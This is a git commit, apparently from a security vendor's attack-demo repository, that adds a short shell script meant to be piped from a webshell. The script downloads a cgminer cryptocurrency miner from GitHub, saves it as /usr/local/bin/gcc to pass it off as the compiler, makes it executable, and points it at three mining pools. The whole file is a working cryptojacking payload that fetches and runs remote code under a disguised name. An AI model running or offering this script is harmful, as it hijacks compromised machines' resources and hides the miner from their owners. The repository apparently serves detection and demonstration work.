aa13291d852f301bb422697d550cd65d353d660b
Néstor Salceda <nestor.salceda@sysdig.com>
2019-10-24 13:46:21 +0200

    Add an script to pipe from the webshell

---
+++ run.sh
@@ -0,0 +1,11 @@
+#!/bin/sh
+
+TARGET=/usr/local/bin/gcc
+
+curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/binaries/cgminer -o $TARGET -s
+chmod +x $TARGET
+
+$TARGET -T \
+  -o stratum+tcp://stratum.slushpool:3333 -u foobar -p baz \
+  -o stratum+tcp://stratum.f2pool.com:3333 -u foobar -p baz \
+  -o stratum+tcp://stratum.antpool.com:3333 -u foobar -p baz
